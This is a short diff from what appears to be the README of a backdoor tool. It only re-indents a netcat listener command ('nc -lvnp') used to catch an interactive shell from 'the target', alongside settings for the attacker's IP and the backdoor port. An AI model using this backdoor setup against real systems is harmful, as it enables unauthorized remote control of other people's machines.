@@ -17,7 +17,7 @@ lhost = your IP adress
 lport = the port you want to use for the Backdoor. I recommend ssh (22).
 
 ## NetCat Command
-     stty raw -echo; (stty size; cat) | nc -lvnp rport rhost
+    stty raw -echo; (stty size; cat) | nc -lvnp rport rhost
 rhost = the target
 rport = the port you want to use for the Backdoor (same as lport).
 
